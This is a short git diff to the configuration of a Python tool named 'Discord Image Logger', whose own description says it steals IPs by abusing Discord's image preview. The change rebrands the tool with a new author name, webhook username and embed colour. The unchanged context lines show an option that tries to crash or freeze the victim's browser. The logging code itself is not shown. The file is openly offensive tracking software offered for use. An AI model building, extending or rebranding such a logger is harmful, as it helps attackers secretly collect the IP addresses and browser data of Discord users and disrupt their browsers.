@@ -8,7 +8,7 @@ import traceback, requests, base64, httpagentparser
 __app__ = "Discord Image Logger"
 __description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
 __version__ = "v2.0"
-__author__ = "DeKrypt"
+__author__ = "MoonLight"
 
 config = {
     # BASE CONFIG #
@@ -18,8 +18,8 @@ config = {
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
     # CUSTOMIZATION #
-    "username": "Image Logger", # Set this to the name you want the webhook to have
-    "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)
+    "username": "MoonLogger", # Set this to the name you want the webhook to have
+    "color": 808080, # Hex Color you want for the embed (Example: Red is 0xFF0000)
 
     # OPTIONS #
     "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
